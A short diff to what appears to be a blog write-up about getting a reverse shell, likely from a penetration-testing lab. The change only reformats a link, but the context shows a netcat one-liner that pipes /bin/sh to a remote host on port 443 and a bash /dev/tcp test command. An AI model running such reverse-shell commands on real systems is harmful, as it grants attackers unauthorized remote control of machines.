@@ -27,7 +27,9 @@ tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.11.0.49 443 1> /tmp/1
 
 And don't forget, all your commands are stored in the /tmp/1 file... (ツ)
 
-From many other options I found, none seemed to work. A quick test showed that the famous [/dev/tcp/<ip>/<port>](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) did not work either. The following command did not result in any response on my machine.
+From many other options I found, none seemed to work. A quick test showed that the famous 
+[/dev/tcp/&lt;ip&gt;/&lt;port&gt;](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) 
+did not work either. The following command did not result in any response on my machine.
 
 {% highlight bash %}
 echo foo > /dev/tcp/10.11.0.13/443
